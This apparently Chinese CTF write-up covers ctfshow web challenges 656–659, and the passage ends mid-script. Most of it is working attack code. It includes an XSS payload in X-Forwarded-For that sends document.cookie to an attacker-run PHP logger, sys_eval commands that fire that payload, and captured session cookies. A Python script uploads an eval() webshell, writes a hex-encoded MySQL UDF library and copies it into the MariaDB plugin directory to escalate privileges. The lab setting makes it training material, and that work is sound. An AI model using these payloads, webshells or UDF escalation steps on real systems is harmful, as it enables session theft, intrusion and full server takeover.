<p>这边看到可以打一个<code>xss</code>,但是从哪里打呢又发现<code>username</code>和<code>password</code>有函数保护，所以用<code>xff</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=echo `curl -H &#x27;X-Forwarded-For: &lt;script&gt;alert(1);&lt;/script&gt;&#x27; http://172.2.41.3//index.php?action=login`;</span><br></pre></td></tr></table></figure>

<p>写文件把<code>cookie</code>打出来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">     <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://172.2.41.4/xss.php?1=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(img);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;PD9waHAKJGNvbnRlbnQgPSAkX0dFVFsxXTsKaWYoaXNzZXQoJGNvbnRlbnQpKXsKICAgICBmaWxlX3B1dF9jb250ZW50cygnY29va2llLnR4dCcsJGNvbnRlbnQpOwp9ZWxzZXsKICAgICBlY2hvICdub25vbm8nOwp9&#x27;|base64 -d &gt; xss.php</span><br><span class="line"></span><br><span class="line">echo &#x27;dmFyIGltZyA9IG5ldyBJbWFnZSgpOwppbWcuc3JjID0gImh0dHA6Ly8xNzIuMi40MS40L3hzcy5waHA/MT0iK2RvY3VtZW50LmNvb2tpZTsKZG9jdW1lbnQuYm9keS5hcHBlbmQoaW1nKTs=&#x27;|base64 -d &gt; xss.js</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;sudo curl -i -H &quot;X-Forwarded-For:&lt;script&gt;document.location=\&#x27;http://172.2.41.4/xss.php?cookie=\&#x27;%2bdocument.cookie;&lt;/script&gt;&quot;  http://172.2.41.5/index.php?action=login&#x27;);</span><br></pre></td></tr></table></figure>

<p>X 出cookie了但是没有<code>flag</code>(拿别人的交了不小心点到提示还扣了我300分)</p>
<p>什么情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ cat cookie.txt</span><br><span class="line">PHPSESSID=v8qgc9jfofr940r74jqmolt2k1; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=</span><br></pre></td></tr></table></figure>

<h1 id="web657"><a href="#web657" class="headerlink" title="web657"></a>web657</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span>  FLAG_657;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$m</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;getFlag&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;testFile&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">testFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="comment"># code...</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;请先登陆&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么带着<code>cookie</code>上就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ curl -H &#x27;Cookie:PHPSESSID=v8qgc9jfofr940r74jqmolt2k1; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=&#x27; &#x27;172.2.41.5/index.php?action=main&amp;m=getFlag&#x27;</span><br><span class="line"></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 100    73    0    73    0     0  73000      0 --:--:-- --:--:-- --:--:-- 73000</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;message&quot;:&quot;flag_657=ctfshow&#123;2a73f8f87a58a13c23818fafd83510b1&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web658"><a href="#web658" class="headerlink" title="web658"></a>web658</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testFile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$f</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>)).<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">		<span class="variable">$result</span> = FLAG_658;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>爆破文件名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">21</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;listening 0.0.0.0 21\n&#x27;</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 a\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;230 a\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;200 a\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;200 a\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;200\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;200 a\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;200\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;200 a\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;aW1wb3J0IHNvY2tldApzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmJpbmQoKCcwLjAuMC4wJywgMjEpKQpzLmxpc3RlbigxKQpwcmludCgnbGlzdGVuaW5nIDAuMC4wLjAgMjFcbicpCmNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCmNvbm4uc2VuZChiJzIyMCBhXG4nKQpjb25uLnNlbmQoYicyMzAgYVxuJykKY29ubi5zZW5kKGInMjAwIGFcbicpCmNvbm4uc2VuZChiJzIwMCBhXG4nKQpjb25uLnNlbmQoYicyMDBcbicpCmNvbm4uc2VuZChiJzIwMCBhXG4nKQpjb25uLnNlbmQoYicyMDBcbicpCmNvbm4uc2VuZChiJzIwMCBhXG4nKQpjb25uLmNsb3NlKCkK&#x27;|base64 -d &gt; 1.py</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python 1.py</span><br><span class="line"></span><br><span class="line">curl -H &#x27;PHPSESSID=v8qgc9jfofr940r74jqmolt2k1; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=&#x27; &#x27;172.2.41.5/index.php?action=main&amp;m=testFile&amp;f=ftp://172.2.41.4/a&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="web659"><a href="#web659" class="headerlink" title="web659"></a>web659</h1><p>里面还有<code>robots.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.2.41.5/robots.txt</span><br><span class="line"></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 100    19  100    19    0     0   6333      0 --:--:-- --:--:-- --:--:--  6333</span><br><span class="line">disallowed /public/</span><br></pre></td></tr></table></figure>

<p>emm 靶机延时用完了，去找个脚本来写马</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">sess=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://6ad980c6-186e-493f-8373-63593e72a9b6.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="comment">#模拟数据备份,写入木马</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成木马</span></span><br><span class="line">sess.post(url+<span class="string">&quot;system36d/users.php?action=upload&quot;</span>,files=files)</span><br><span class="line">data1=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;key_is_here_you_know&quot;</span>,<span class="string">&quot;file&quot;</span>:<span class="string">&quot;../db/data_you_never_know.db&quot;</span>,<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/a.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line">sess.post(url+<span class="string">&#x27;system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;&#x27;</span>,data=data1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#udf提权</span></span><br><span class="line">data2=&#123; <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;file_put_contents(\&#x27;udf.so\&#x27;,hex2bin(\&#x27;7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e8162000\&#x27;));&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;../db/data_you_never_know.db&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;key_is_here_you_know&#x27;</span>&#125;</span><br><span class="line">sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=data2)</span><br><span class="line">data3=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;shell_exec(&#x27;cp /var/www/html/udf.so /usr/lib/mariadb/plugin/udf.so&#x27;);&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;../db/data_you_never_know.db&#x27;</span>,</span><br><span class="line">    <span 